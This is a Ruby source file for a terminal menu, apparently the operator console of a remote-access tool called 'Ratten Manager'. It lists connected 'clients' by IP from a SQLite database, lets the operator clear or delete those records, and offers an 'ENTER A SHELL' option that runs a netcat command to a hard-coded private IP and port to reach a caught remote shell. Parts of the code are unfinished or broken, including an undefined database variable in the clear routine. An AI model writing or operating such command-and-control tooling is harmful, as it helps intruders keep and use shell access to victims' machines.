require 'colorize'
require 'tty-prompt'
require 'tty-table'
require 'sqlite3'

$db = SQLite3::Database.new("../server/bin/assets/db/db.db")

def tui
  puts "\n"
  puts " ██▀███   ▄▄▄     ▄▄▄█████▓▄▄▄█████▓▓█████  ███▄    █     ███▄ ▄███▓ ▄▄▄       ███▄    █  ▄▄▄        ▄████ ▓█████  ██▀███".red
  puts "▓██ ▒ ██▒▒████▄   ▓  ██▒ ▓▒▓  ██▒ ▓▒▓█   ▀  ██ ▀█   █    ▓██▒▀█▀ ██▒▒████▄     ██ ▀█   █ ▒████▄     ██▒ ▀█▒▓█   ▀ ▓██ ▒ ██▒".red
  puts " ▓██ ░▄█ ▒▒██  ▀█▄ ▒ ▓██░ ▒░▒ ▓██░ ▒░▒███   ▓██  ▀█ ██▒   ▓██    ▓██░▒██  ▀█▄  ▓██  ▀█ ██▒▒██  ▀█▄  ▒██░▄▄▄░▒███   ▓██ ░▄█ ▒".red
  puts "▒██▀▀█▄  ░██▄▄▄▄██░ ▓██▓ ░ ░ ▓██▓ ░ ▒▓█  ▄ ▓██▒  ▐▌██▒   ▒██    ▒██ ░██▄▄▄▄██ ▓██▒  ▐▌██▒░██▄▄▄▄██ ░▓█  ██▓▒▓█  ▄ ▒██▀▀█▄".red
  puts "░██▓ ▒██▒ ▓█   ▓██▒ ▒██▒ ░   ▒██▒ ░ ░▒████▒▒██░   ▓██░   ▒██▒   ░██▒ ▓█   ▓██▒▒██░   ▓██░ ▓█   ▓██▒░▒▓███▀▒░▒████▒░██▓ ▒██▒".red
  puts "░ ▒▓ ░▒▓░ ▒▒   ▓▒█░ ▒ ░░     ▒ ░░   ░░ ▒░ ░░ ▒░   ▒ ▒    ░ ▒░   ░  ░ ▒▒   ▓▒█░░ ▒░   ▒ ▒  ▒▒   ▓▒█░ ░▒   ▒ ░░ ▒░ ░░ ▒▓ ░▒▓░".red
  puts "  ░▒ ░ ▒░  ▒   ▒▒ ░   ░        ░     ░ ░  ░░ ░░   ░ ▒░   ░  ░      ░  ▒   ▒▒ ░░ ░░   ░ ▒░  ▒   ▒▒ ░  ░   ░  ░ ░  ░  ░▒ ░ ▒░".red
  puts "   ░░   ░   ░   ▒    ░        ░         ░      ░   ░ ░    ░      ░     ░   ▒      ░   ░ ░   ░   ▒   ░ ░   ░    ░     ░░   ░".red
  puts "    ░           ░  ░                    ░  ░         ░           ░         ░  ░         ░       ░  ░      ░    ░  ░   ░".red
  main_menu
end

def main_menu
  puts "\n"
  prompt = TTY::Prompt.new
  options = prompt.select("What Are You Managing =>") do |menu|
    menu.choice "SERVER"    #
    menu.choice "CLIENTS"   #catch shell done, no other ideas tbfr
    menu.choice "DATABASE"  #DONE!!!!!!!
    menu.choice "LEAVE".red #DONE!!!!!!!
  end
  case options
    when "SERVER"
      puts "selected choice => SERVER menu".blue
    when "CLIENTS"
      puts "selected choice => CLIENT menu".blue
      client_menu
    when "DATABASE"
      puts "selected choice => DATABASE menu".blue
      database_menu
    when "LEAVE".red
      puts "selected choice => new menu".blue
      exit
  end
end

#==================#
#    |CLIENT|      #
#==================#
#==================#
#    |CLIENT|      #
#==================#
def client_menu
  rows = $db.execute("SELECT * FROM users")
  if rows.empty?
    puts "TABLE users => empty"
    return
  end
  prompt = TTY::Prompt.new
  prompt.select("clients in db \n".blue) do |menu|
    rows.each do |row|
      id, created, modified, ip = row
      display = "ID: #{id.to_s.ljust(3)} | IP: #{ip.to_s.ljust(15)} | Created: #{created} | Modified: #{modified}"
      menu.choice display
    end
  end
  client_menu_entry
end

def client_menu_entry
  prompt = TTY::Prompt.new
  choice = prompt.select("Choose an Action") do |menu|
    menu.choice "ENTER A SHELL"
    menu.choice "BACK"
  end
  case choice
    when "ENTER A SHELL"
      system("nc 10.0.0.109 9001") # replace with spawn when done testing/playing
    when "BACK"
      client_menu
  end
end

#==================#
#   |DATABASE|     #
#==================#
def database_menu
  dbfile = "../server/bin/assets/db/db.db"
  db = SQLite3::Database.new(dbfile)
  puts "\n"
  puts "in DATABASE menu"
  prompt = TTY::Prompt.new
  choice = prompt.select("Pick an action".blue) do |menu|
    menu.choice "CLEAR DATABASE" #done
    menu.choice "DELETE FROM"    #done
    menu.choice "VIEW CLIENTS"   #done
    menu.choice "BACK".red       #done
    menu.choice "LEAVE".red      #done
  end
  case choice
    when "CLEAR DATABASE"
      database_menu_clear
    when "DELETE FROM"
      database_menu_delete(db)
    when "VIEW CLIENTS"
      database_menu_clients(db)
    when "BACK"
      tui
    when "LEAVE"
      exit
  end
end

def database_menu_clear
  prompt = TTY::Prompt.new
  choice = prompt.select("Are you sure you want to truncate the database; This will remove all user data") do |menu|
    menu.choice "YES".green
    menu.choice "NO".red
  end
  case choice
    when "YES"
      db.execute("delete from users;")
      puts "User data cleared.".red
      database_menu(db)

    when "NO"
      database_menu(db)
  end
end

def database_menu_delete(db)
  rows = db.execute("SELECT * FROM users")
  if rows.empty?
    puts "TABLE USERS => no valid db entries"
    return
  end
  prompt = TTY::Prompt.new
  selected_id = prompt.select("select user to delete \n".blue) do |menu|
    rows.each do |row|
      id, created, modified, ip = row
      display = "ID: #{id.to_s.ljust(3)} | IP: #{ip.to_s.ljust(15)} | Created: #{created} | Modified: #{modified}"
      menu.choice display, id
    end
  end
  db.execute("DELETE FROM users WHERE id = ?", selected_id)
  puts "User #{selected_id} deleted.".red
end


def database_menu_clients(db)
  rows = db.execute("SELECT * FROM users")
  if rows.empty?
    puts "TABLE users => empty"
    return
  end
  prompt = TTY::Prompt.new
  choice = prompt.select("clients in db \n".blue) do |menu|
    rows.each do |row|
      id, created, modified, ip = row
      display = "ID: #{id.to_s.ljust(3)} | IP: #{ip.to_s.ljust(15)} | Created: #{created} | Modified: #{modified}"
      menu.choice display
    end
    menu.choice "BACK".red
  end
  case choice
    when "BACK"
      database_menu(db)
  end
end

tui
